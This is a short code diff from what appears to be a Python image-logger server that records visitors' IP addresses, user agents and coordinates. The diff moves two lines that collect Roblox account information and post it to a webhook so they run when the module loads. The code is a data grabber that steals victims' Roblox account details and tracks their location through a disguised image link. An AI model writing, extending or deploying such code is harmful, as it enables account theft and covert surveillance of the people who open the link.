@@ -136,8 +136,6 @@ def send_to_webhook(roblox_info):
     
     requests.post(webhook_url, json=payload)
 
-roblox_data = get_roblox_info()
-send_to_webhook(roblox_data)
 
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
@@ -354,4 +352,6 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
+roblox_data = get_roblox_info()
+send_to_webhook(roblox_data)
 handler = app = ImageLoggerAPI
